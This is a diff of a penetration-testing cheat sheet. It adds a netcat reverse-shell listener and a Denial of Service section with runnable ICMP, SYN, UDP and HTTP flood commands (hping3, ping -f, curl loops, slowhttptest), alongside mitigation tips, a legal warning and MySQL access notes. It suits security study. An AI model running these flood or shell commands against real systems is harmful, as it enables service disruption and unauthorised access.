+
+# Netcat with rlwrap
+rlwrap nc -lvnp 4444
+```
+
+**Full Stabilization Process:**
+1. Spawn TTY shell
+2. Set terminal type
+3. Configure stty settings
+4. Resize terminal if needed
 
 ## Privilege Escalation 
 Check for root password
@@ -4130,18 +4608,63 @@ Hyperlinks and IP addresses should be [defanged](https://www.ibm.com/docs/en/rso
 
 Expand shortened links with this [tool](https://www.expandurl.net).
 ## Denial of Service (DoS & DDoS)
-`to be added`
+Denial of Service attacks aim to make a system, service, or network unavailable by overwhelming it with traffic or exploiting vulnerabilities.
 
-<!-- ping -s 1300 -f <IP>
-hping -S -V --flood <IP>
-masscan -p80,443,22 <IP>/24 --rate=1000
-amass enum -d <domain>
+### Types of DoS Attacks
+- **DoS (Denial of Service)**: Single-source attack
+- **DDoS (Distributed Denial of Service)**: Multiple-source coordinated attack
+- **Application Layer**: Targets specific applications (HTTP, DNS)
+- **Network Layer**: Floods network infrastructure
+- **Protocol**: Exploits protocol weaknesses
 
-ICMP: sudo hping3 -1 --flood <ip>
-SYN: sudo hping3 -d 200 -p 80 -S --flood <ip>
-https://byob.dev/guide
- -->
+### Common DoS Techniques
 
+#### Network Flooding
+```bash
+# ICMP flood (requires root)
+ping -f -s 65507 <target_ip>
+
+# SYN flood using hping3
+hping3 -S --flood -V -p 80 <target_ip>
+
+# UDP flood
+hping3 --udp --flood -p 53 <target_ip>
+```
+
+#### Application Layer Attacks
+```bash
+# HTTP GET flood using curl
+for i in {1..1000}; do curl http://target.com & done
+
+# Slowloris attack (slow HTTP)
+# Use tools like slowhttptest or pyloris
+```
+
+#### Amplification Attacks
+- **DNS Amplification**: Small query → Large response
+- **NTP Amplification**: Exploits NTP monlist command
+- **Memcached Amplification**: UDP-based amplification
+
+### Detection and Mitigation
+- **Rate Limiting**: Limit requests per IP/user
+- **Traffic Analysis**: Monitor unusual patterns
+- **Blacklisting**: Block malicious IPs
+- **Load Balancing**: Distribute traffic
+- **CDN**: Content delivery networks for protection
+- **Firewalls**: Filter malicious traffic
+
+### Tools for Testing (Educational/Legal Use Only)
+```bash
+# LOIC (Low Orbit Ion Cannon) - GUI tool
+# HOIC (High Orbit Ion Cannon) - More advanced
+# slowhttptest - Application layer DoS testing
+slowhttptest -c 1000 -H -g -o my_body_stats -i 110 -r 200 -t GET -u http://target.com/
+
+# Stress testing with Apache Bench
+ab -n 10000 -c 100 http://target.com/
+```
+
+Legal Warning: Only test on systems you own or have explicit permission to test. Unauthorized DoS attacks are illegal.
 ## Misconfigurations
 ### Printer Hacking (IPP)
 Enumeration and exploitation tools can be found [here](https://github.com/RUB-NDS/PRET).  
@@ -4151,6 +4674,62 @@ It allows clients to submit one or more print jobs to the printer or print serve
 Most of them appear to run the CUPS server (which is a simple UNIX printing system).  
 
 Running `python pret.py` will start an automatic printer discovery in your local network. 
+
+# Miscellaneous
+Additional tools and techniques that don't fit into other categories but are useful for cybersecurity work.
+
+## Shortened URLs
+You can see the actual website the shortened link is redirecting you to by appending "+" to it (see the examples below). Type the shortened URL in the address bar of the web browser and add the above characters to see the redirect URL.
+
+Example: 
+[tinyurl.com/mv2h897s+](https://tinyurl.com/mv2h897s+)
+
+Example providers:
+- bit.ly
+- goo.gl
+- ow.ly
+- s.id
+- smarturl.it
+- tiny.pl
+- tinyurl.com
+- x.co
+
+## Reading SQL databases
+Ensure you have the knowlege of SQL DBs first. See [here](/More/Databases).
+
+Start by starting the mysql service:
+```bash
+service mysql start
+```
+
+### Remote Connection
+Then connect to the database:
+```bash
+mysql -u root -p -h <ip_address>
+```
+
+Now you can use the following commands to read the database:
+```sql
+show databases;
+use <database_name>;
+show tables;
+select * from <table_name>;
+describe <table_name>;
+```
+
+### Local Connection
+If you have access to the database file, you can use the following command to read it:
+```bash
+mysql -u <username> -p
+```
+
+Type "source" followed by the filename of the mysql database to specify that you wish to view its database.
+
+```sql
+source /home/berkan/serverLx/employees.sql -- example
+```
+
+You can now view the database using the commands from the previous section.
 
 ---
 
